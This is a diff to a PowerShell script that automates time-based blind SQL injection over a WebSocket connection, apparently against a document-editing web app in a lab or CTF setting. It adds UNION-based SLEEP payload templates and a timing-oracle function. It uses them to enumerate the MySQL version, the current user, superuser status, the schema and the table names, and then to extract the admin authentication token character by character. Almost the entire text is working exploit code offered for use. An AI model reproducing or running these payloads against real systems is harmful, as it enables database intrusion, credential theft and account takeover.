@@ -68,7 +68,8 @@ Write-Output "Creating Document  $($result.Status)"
 
 $strlen_sqli = "' union select null,(SELECT IF((select length(({0}))={1}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
 $extract_char_sqli = "' union select null,(SELECT IF((select ascii(substring(({0}),{1},1))={2}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
-$extract_count_sqli = "' union select null,(SELECT IF(({0})={1}),(select sleep(10)),(select 1))),null,null,null,null,null,null-- "
+$extract_count_sqli = "' union select null,( SELECT IF( (({0})={1}),SLEEP(10),'a') ),null,null,null,null,null,null;-- "
+$eval_binary_stm_sqli = "' union select null,(SELECT IF( (({0})),SLEEP(10),'a') ),null,null,null,null,null,null;-- "
 # add super user
 
 # database name
@@ -179,6 +180,29 @@ function Get-String {
   return $extracted_string
 }
 
+function Get-Query {
+  param (
+    [Parameter(Mandatory=$true)]
+    [scriptblock] $SQLIScriptBlock,
+    [Parameter(Mandatory=$true)]
+    [scriptblock] $TransportScriptBlock,
+    [Parameter(Mandatory=$true)]
+    [string] $Query
+  )
+  $guess = Invoke-Command -ScriptBlock $SQLIScriptBlock -ArgumentList $Query
+  Write-Debug $guess
+  $stopwatch = [System.Diagnostics.Stopwatch]::new()
+  $stopwatch.Start()
+  Invoke-Command -ScriptBlock $TransportScriptBlock -ArgumentList $guess, 0, $debug
+  $stopwatch.Stop()
+  if($stopwatch.Elapsed.Seconds -ge 10) {
+    Write-Debug "Time Elapsed: $($stopwatch.Elapsed)"
+    return $true
+  }
+  else { Write-Debug "$($stopwatch.Elapsed)" }
+  return $false
+}
+
 $transport = {
   param($msg, $SocketId, $debug)
   if($debug) {
@@ -204,31 +228,58 @@ $getCountTables = {
   param($len, $Query)
   $check_email -f $token, ($extract_count_sqli -f "$Query","$len") 
 }
+$getQuery = {
+  param($Query) 
+  $check_email -f $token, ($eval_binary_stm_sqli -f "$Query") 
+}
 
 $CharacterSets = @{
   versionAsciiChars = @(46,48,49,50,51,52,53,54,55,56,57)
   printableChars= 32..127
 }
 <#
+# Database version enumeration
 $len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select version()" -MaxLength 10
 Write-Output "MySQL version string length: $len"
 $mySQLVersion = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select version()" -Characterset $CharacterSets.printableChars -Length $len
 Write-Output "MySQL version: $mySQLVersion"
 
+#Current User and user priviledges enumeration
 $len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select current_user()" -MaxLength 20
 Write-Output "Current User string length: $len"
 $currentUser = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select current_user()" -Characterset $CharacterSets.printableChars -Length $len
 Write-Output "Current User: $currentUser"
-#>
+$isSuperUser = Get-Query -SQLIScriptBlock $getQuery -TransportScriptBlock $transport -Query "SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='$currentUser')>1"
+Write-Output "Current User: $currentUser is superuser?: $isSuperUser"
 
+# Database schema and Tables enumeration
 $len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select database()" -MaxLength 10
 Write-Output "Schema string length: $len"
 $schema = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select database()" -Characterset $CharacterSets.printableChars -Length $len
 Write-Output "Schema Nane: $schema"
-
-
-$num_tables = Get-Count -SQLIScriptBlock $getCountTables -TransportScriptBlock $transport -Query "select count(table_name) from information_schema.tables where table_schema='docedit'" -MaxLength 10 -Debug
+$num_tables = Get-Count -SQLIScriptBlock $getCountTables -TransportScriptBlock $transport -Query "select count(table_name) from information_schema.tables where table_schema='$schema'" -MaxLength 10
 Write-Output "Number of tables in $schema is $num_tables"
+$table_name_lengths = [System.Collections.ArrayList]::new()
+$table_names = [System.Collections.ArrayList]::new()
+for($i = 0; $i -lt $num_tables; ++$i) {
+  $len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "SELECT table_name FROM information_schema.tables LIMIT $i,1" -MaxLength 30
+  $table_name_lengths.Add($len)
+  Write-Output "Table found with length: $len"
+}
+for($i = 0; $i -lt $num_tables; ++$i) {
+  $table_name = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "SELECT table_name FROM information_schema.tables LIMIT $i,1" -Characterset $CharacterSets.printableChars -Length $table_name_lengths[$i]
+  $table_names.Add($table_name)
+  Write-Output "Found table: $table_name"
+}
 
+# do columns
+#>
+
+
+# get auth token
+$len = Get-StringLength -SQLIScriptBlock $getLength -TransportScriptBlock $transport -Query "select token from AuthTokens where id = 1 limit 0,1" -MaxLength 40
+Write-Output "AuthToken string length: $len"
+$admin_auth_token = Get-String -SQLIScriptBlock $extractString -TransportScriptBlock $transport -Query "select token from AuthTokens where id = 1 limit 0,1" -Characterset $CharacterSets.printableChars -Length $len
+Write-Output "Admin Auth Token: $admin_auth_token"
 
 Remove-Module PoshWebSocketClient
